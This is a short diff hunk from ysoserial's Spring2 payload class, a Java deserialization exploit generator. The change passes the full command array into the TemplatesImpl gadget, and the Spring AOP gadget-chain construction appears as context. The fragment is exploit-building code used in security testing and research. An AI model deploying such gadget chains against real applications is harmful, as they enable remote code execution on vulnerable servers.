@@ -46,7 +46,7 @@ import ysoserial.payloads.util.Reflections;
 public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
 
     public Object getObject ( final String ... command ) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command[0]);
+        final Object templates = Gadgets.createTemplatesImpl(command);
 
         AdvisedSupport as = new AdvisedSupport();
         as.setTargetSource(new SingletonTargetSource(templates));
